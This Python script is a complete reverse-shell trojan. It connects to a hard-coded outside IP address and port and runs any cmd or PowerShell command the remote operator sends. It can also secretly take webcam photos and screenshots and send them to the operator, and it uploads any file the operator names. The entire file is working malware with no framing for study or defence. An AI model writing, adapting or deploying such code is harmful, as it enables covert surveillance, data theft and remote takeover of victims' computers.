import os
import socket
import subprocess
import cv2
import random
from PIL import ImageGrab
from io import BytesIO
import sys


def webcam_pic(s,data):
     cam_port = 0
     cam = cv2.VideoCapture(cam_port)
     result, image = cam.read()
     filename=str(random.choice(range(100)))+".png"
     if result: 
          cv2.imwrite(filename, image) 
     with open(filename, "rb") as file:
          while data := file.read(1024):
               s.send(data)
     s.send(str.encode("Sended"))
     cam.release()
     os.remove(filename)


def download(s,data):
     filename=str(s.recv(1024),"utf-8")
     with open(filename,"rb") as file:
          while data := file.read(1024):
              s.sendall(data)


def screenshot(s,data):
     buffer=BytesIO()
     screenshot = ImageGrab.grab()
     screenshot.save(buffer,format="PNG")
     buffer.seek(0)
     while data := buffer.read(1024):
          s.send(data)
     s.send(str.encode("Sended"))
          
          
def cmd(s,data):
     if data[:2].decode("utf-8")=="cd":
          cd(s,data)
     elif data[:2].decode("utf-8")=="ss":
          screenshot(s,data)
     elif data[:6].decode("utf-8")=="webcam":
          webcam_pic(s,data)
     elif data[:8].decode("utf-8")=="download":
          download(s,data)
     else:
          cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
          output=cmd.stdout.read()+cmd.stderr.read()
          output=str(output,"utf-8")
          string3=str.encode(output+os.getcwd()+'>',"utf-8")
          s.sendall(string3)


def cd(s,data):
     os.chdir(data[3:].decode("utf-8"))
     s.sendall(str.encode("\n"+os.getcwd()+'>',"utf-8"))
                
                
def powershell(s,data):
     if data[:2].decode("utf-8")=="cd":
          cd(s,data)
     elif data[:2].decode("utf-8")=="ss":
          screenshot(s,data)
     elif data[:6].decode("utf-8")=="webcam":
          webcam_pic(s,data)
     elif data[:8].decode("utf-8")=="download":
          download(s,data)
     else:
          p=subprocess.Popen(["powershell","-Command",data.decode("utf-8")],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,shell=True)
          output=p.stdout.read()+p.stderr.read()
          string3=str.encode(output+os.getcwd()+'>',"utf-8")
          s.sendall(string3)


def connect():
   s=socket.socket()
   host="182.183.126.71"
   port=1235
   s.connect((host,port))
   choice=s.recv(1024)
   choice=choice.decode("utf-8")
   return (choice,s)


def main():
     c,s=connect()
     while True:
        try:
           data=s.recv(32000)
           if len(data) > 0:
               if c=="CMD":
                    cmd(s,data)
               elif c=="PS":
                    powershell(s,data)   
               else:
                    sys.exit("WRONG CHOICE")    
        except KeyboardInterrupt:
          s.close()
          break
     s.close()
     
main()
